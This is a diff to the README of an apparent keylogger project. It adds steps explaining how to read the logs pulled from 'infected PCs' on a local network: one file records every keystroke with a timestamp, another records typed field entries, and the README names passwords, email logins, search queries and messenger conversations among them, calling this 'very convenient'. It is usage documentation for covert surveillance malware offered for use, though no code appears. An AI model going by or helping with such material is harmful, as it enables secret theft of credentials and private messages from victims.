@@ -9,6 +9,10 @@
 
 **3.** You can run the [Controller](https://github.com/ArGul-0/Local-Keylogger-Controller) (located in a separate repository) - *https://github.com/ArGul-0/Local-Keylogger-Controller*, to remotely pull logs from all infected PCs on the local network to your device. The result will be saved to the Documents folder for your use.
 
+**4.** When you go to the documents, you will see a file in .ZIP format and with the name in keylog format, the IP of the Infected machine, and the PORT of the Infected machine. After Opening / Unpacking it, you will see 2 .txt files.
+
+**5.** By opening the file AllClicks.txt you will see all the keys pressed on the infected machine in the format: Date, time, key pressed. By opening the file OnlyKeyPressClicks.txt you will see all the characters entered in the fields (not all clicks, but field entries. For example, printing in the browser in the search bar, entering a password / mail, correspondence in messengers, etc.), that is, without keyboard shortcuts, random keystrokes, etc. Only field entries (It's very convenient).
+
 
 
 **Main advantages:**
